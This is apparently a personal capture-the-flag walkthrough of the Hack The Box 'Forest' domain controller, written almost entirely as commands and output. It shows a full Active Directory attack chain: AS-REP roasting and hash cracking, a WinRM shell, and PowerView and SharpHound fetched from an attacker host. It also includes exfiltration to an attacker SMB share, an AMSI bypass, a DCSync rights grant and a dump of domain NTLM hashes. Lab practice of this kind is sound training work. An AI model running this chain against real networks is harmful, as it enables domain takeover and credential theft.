# Forest
## impacket-GetNPUsers
## impacket-smbserver
## impacket-secretsdump
## Evil-winrm
## Bloodhound
## Powersploit
``````

➜  mkdir -p ~/htb/Active_Directory_101/Forest
➜  sudo vi /etc/hosts
Add:

10.10.10.161 forest.htb

➜  ~ rustscan -a forest.htb --ulimit 5000

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49676/tcp open  unknown          syn-ack
49677/tcp open  unknown          syn-ack
49684/tcp open  unknown          syn-ack
49703/tcp open  unknown          syn-ack
49920/tcp open  unknown          syn-ack

➜  ~ sudo nmap -Pn -sV -T4 -p- -oA ~/htb/Active_Directory_101/Forest -vv forest.htb

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-06-29 16:18:48Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49920/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

➜  ~ sudo nmap -Pn -sU -T4 -p1-500 -vv forest.htb  

PORT    STATE         SERVICE         REASON
21/udp  open|filtered ftp             no-response
53/udp  open          domain          udp-response ttl 127
88/udp  open|filtered kerberos-sec    no-response
99/udp  open|filtered metagram        no-response
101/udp open|filtered hostname        no-response
122/udp open|filtered smakynet        no-response
123/udp open          ntp             udp-response ttl 127
133/udp open|filtered statsrv         no-response
137/udp open|filtered netbios-ns      no-response
138/udp open|filtered netbios-dgm     no-response
290/udp open|filtered unknown         no-response
312/udp open|filtered vslmp           no-response
366/udp open|filtered odmr            no-response
382/udp open|filtered hp-managed-node no-response
387/udp open|filtered aurp            no-response
389/udp open          ldap            udp-response ttl 127
399/udp open|filtered iso-tsap-c2     no-response
408/udp open|filtered prm-sm          no-response
464/udp open|filtered kpasswd5        no-response
500/udp open|filtered isakmp          no-response

➜  ~ sudo nmap -Pn -A -T4 -p- -oA ~/htb/Active_Directory_101/Forest -vv forest.htb

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-06-29 16:33:11Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49920/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61232/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 60919/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44587/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2022-06-29T16:34:15
|_  start_date: 2022-06-28T22:59:24
|_clock-skew: mean: 2h26m50s, deviation: 4h02m31s, median: 6m49s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-06-29T09:34:14-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

➜  ~ sudo ldapsearch -x -H ldap://forest.htb -b 'dc=forest.htb,dc=forest.local'

# extended LDIF
#
# LDAPv3
# base <dc=forest.htb,dc=forest.local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 10 Referral
text: 0000202B: RefErr: DSID-031007F9, data 0, 1 access points
	ref 1: 'forest.
 htb.forest.local'

ref: ldap://forest.htb.forest.local/dc=forest.htb,dc=forest.local

# numResponses: 1

➜  ~ sudo ldapsearch -x -H ldap://forest.htb -b 'dc=htb,dc=local' | head -30

# extended LDIF
#
# LDAPv3
# base <dc=htb,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# htb.local
dn: DC=htb,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=htb,DC=local
instanceType: 5
whenCreated: 20190918174549.0Z
whenChanged: 20220628225914.0Z
subRefs: DC=ForestDnsZones,DC=htb,DC=local
subRefs: DC=DomainDnsZones,DC=htb,DC=local
subRefs: CN=Configuration,DC=htb,DC=local
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAOqNrI1l5QUq5WV+CaJoIcQ==
uSNChanged: 888873
name: htb
objectGUID:: Gsfw30mpJkuMe1Lj4stuqw==
replUpToDateVector:: AgAAAAAAAAARAAAAAAAAAIArugegK3xCjpG3jOKvTZsK8AAAAAAAAPxOm
 RMDAAAAEeYhGk0xaEyawzvMi5bZbx0ADQAAAAAA1L0+FwMAAABptVkf+oupR7OwUi6g1GLsFlADAA
 AAAAAB1aoTAwAAADqjayNZeUFKuVlfgmiaCHEFoAAAAAAAAF8hmRMDAAAA/SE/Oe6WNkywQ7wPcI1
 1uhkQBAAAAAAAbsk9FwMAAAAQPAFBtIydRYjierwFjuPXFTADAAAAAADV16YTAwAAALUwxmGiQbBF
 sTRBGrVOMWMI0AAAAAAAAJ89mRMDAAAATnxjeGYW7EmrnM1R7mBIgRNwAgAAAAAA3W2gEwMAAAAx9

➜  rpcclient -U '' -N forest.htb
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querygroup 0x200
rpcclient $> queryuser 0x1f4

➜  for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user}; done
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for Lucinda
[-] User Lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:59a64ba1e326cd6d405b7d851c4d032c$96eef974ac16e7805b97ae1a849a0ca18f70ec791ea9149ba6bd35cf0100e93e857af93461f49fbc2ff74b41dbef6373aa55d385cdc177e54ee51ef64f1d192e868cb7b9951614df9dab615362453e31c8f499ff1a511a810eeb7b8a0953b1d0ad4eee7f734c638c17e5b6893d2f5035da6b9f3be442c0849e6a9dcfed22a92af50314e48f431a1bc1f05c55d64e0f50eda68e5c756d15b1ccd6d9010c4a6a7b0daba007125f6c16a701d2e1012e4a6afa3395eedf14f8fbed6466b82bb7d5f9850090017f304d9cfcb14221a6d02676f4983a7870775709e11ea15e8e11941a

➜  vi hash.txt 
Add:

$krb5asrep$23$svc-alfresco@HTB:b40b94bc133dc51dc09a0b3ea1bfc326$e4c57e0b4b3d6dd531d3d7a703a795a574e5224fb212aa8fef09f2c838a3e97a7430f3da8b9d2650baf6fe5c53c9eebed7391b2d6cad5efd1591397b6446492d7f86f312cbd56134e06ffe916b1058f91747c4b7521de1668308ae27a680a76c63e1031a6940f56516e4b38e3393439b65161ccc42ff2454385dd5e3954f70585d746a75fc791a6ae868360a91d5779e8671a84076d4109aad3eb0a4d9259d7c3036ea0e0565b3b46b0b470ffe80df084e810e3b115c786ba8d49ff89e9f95fb92824132c71ec64942aed0e27b2e81fac24660816fdeba7b4bb11ef787b9bd71

➜  hashcat --help | grep -i 'Kerberos'                                                            

  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol

➜  hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$svc-alfresco@HTB:b40b94bc133dc51dc09a0b3ea1bfc326$e4c57e0b4b3d6dd531d3d7a703a795a574e5224fb212aa8fef09f2c838a3e97a7430f3da8b9d2650baf6fe5c53c9eebed7391b2d6cad5efd1591397b6446492d7f86f312cbd56134e06ffe916b1058f91747c4b7521de1668308ae27a680a76c63e1031a6940f56516e4b38e3393439b65161ccc42ff2454385dd5e3954f70585d746a75fc791a6ae868360a91d5779e8671a84076d4109aad3eb0a4d9259d7c3036ea0e0565b3b46b0b470ffe80df084e810e3b115c786ba8d49ff89e9f95fb92824132c71ec64942aed0e27b2e81fac24660816fdeba7b4bb11ef787b9bd71:s3rvice

Alternatively,

➜  sudo git clone https://github.com/ropnop/windapsearch.git

➜  sudo apt-get install build-essential python3-dev python2.7-dev libldap2-dev libsasl2-dev slapd ldap-utils tox lcov valgrind

➜  pip3 install python-ldap

➜  windapsearch git:(master) ./windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom 'objectClass=*'

Locate svc-alfresco sevice account

---

➜  evil-winrm -i forest.htb -u svc-alfresco -p s3rvice

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd C:\Users\svc-alfresco\Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt

user_flag

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cd C:\Users\svc-alfresco\appdata\local\temp

➜  cd /usr/share/metasploit-framework/data/post
➜  python3 -m http.server

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> invoke-webrequest -Uri “10.10.16.6:8000/SharpHound.exe” -OutFile 'C:\Users\svc-alfresco\appdata\local\temp\SharpHound.exe'
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> powershell.exe -executionpolicy bypass
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> invoke-bloodhound -CollectAll 

➜  sudo impacket-smbserver share . -smb2support -username hey -password hey

on target

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use \\10.10.16.6\share /u:hey hey
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> copy 20220630004846_forest.zip \\10.10.16.6\share
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> del 20220630004846_forest.zip
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use /d \\10.10.16.6\share

Ensure 4.0.3 is downloaded not the apt package @ 4.0.1 due to issues with properly working...

---
If docker required for neo4j server

➜  vi neo4j.sh
Add:
docker run \
    --name neo4j-server \
    -p7474:7474 -p7687:7687 \
    -d \
    -v $HOME/neo4j/data:/data \
    -v $HOME/neo4j/logs:/logs \
    -v $HOME/neo4j/import:/var/lib/neo4j/import \
    -v $HOME/neo4j/plugins:/plugins \
    --env NEO4J_AUTH=neo4j/bl00dh0und \
    neo4j:latest

➜  chmod 700 neo4j.sh
➜  sudo service docker start
➜  ./neo4j.sh 

Authenticate with uname:pword

neo4j:bl00dh0und
---

➜  cd ~/Downloads ; wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.0.3/BloodHound-linux-x64.zip ; unzip BloodHound-linux-x64.zip ; cd BloodHound-linux-x64 ; ./BloodHound --no-sandbox

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net user c0rvu5 hey444! /add /domain
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net group "Exchange Windows Permissions" c0rvu5 /add
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net localgroup "Remote Management Users" c0rvu5 /add

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Env:PSModulePath

C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> mkdir C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules

➜  cd /usr/share/windows-resources/powersploit
➜  sudo wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
➜  python3 -m http.server

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules> invoke-webrequest -Uri "10.10.16.6:8000/PowerView.ps1" -OutFile "C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules\PowerView.ps1"
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules\powersploit> powershell.exe -executionpolicy bypass
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules> import-module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules> Bypass-4MSI
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules\powersploit> $SecPassword = ConvertTo-SecureString 'hey444!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules\powersploit> $Cred = New-Object System.Management.Automation.PSCredential('megacorp\c0rvu5', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules> add-objectacl -principalidentity c0rvu5 -credential $Cred -Rights DCSync

➜  sudo impacket-secretsdump htb/c0rvu5@forest.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

C:\Users\Administrator\Desktop> type C:\Users\svc-alfresco\Desktop\user.txt

user_flag

C:\Users\Administrator\Desktop> type root.txt

root_flag

``````

##### Reference
https://0xdf.gitlab.io/2020/03/21/htb-forest.html
https://bloodhound.readthedocs.io/en/latest/installation/linux.html
https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220629195203.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220629195252.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220629195316.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220629202138.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220629202941.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220629202642.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220629203956.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220709154521.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630024029.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630024229.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630024708.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630025001.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630175318.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220629234100.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630022010.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630022413.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630022441.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630025321.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630025622.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630023117.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630020434.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630025816.png)

#hacking
